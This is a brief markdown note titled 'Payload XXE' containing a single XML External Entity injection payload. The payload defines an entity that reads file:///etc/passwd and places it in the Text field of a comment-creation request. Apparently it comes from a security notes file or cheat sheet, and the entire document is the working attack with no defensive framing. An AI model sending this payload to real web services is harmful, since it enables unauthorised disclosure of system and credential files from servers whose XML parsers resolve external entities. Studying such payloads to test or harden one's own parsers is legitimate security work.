## Payload XXE
```xml
<?xml version="1.0"?><!DOCTYPE doc [<!ENTITY exploit SYSTEM "file:///etc/passwd">]><CreateCommentModel xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><PostId>7</PostId><Text>&exploit;</Text></CreateCommentModel>
```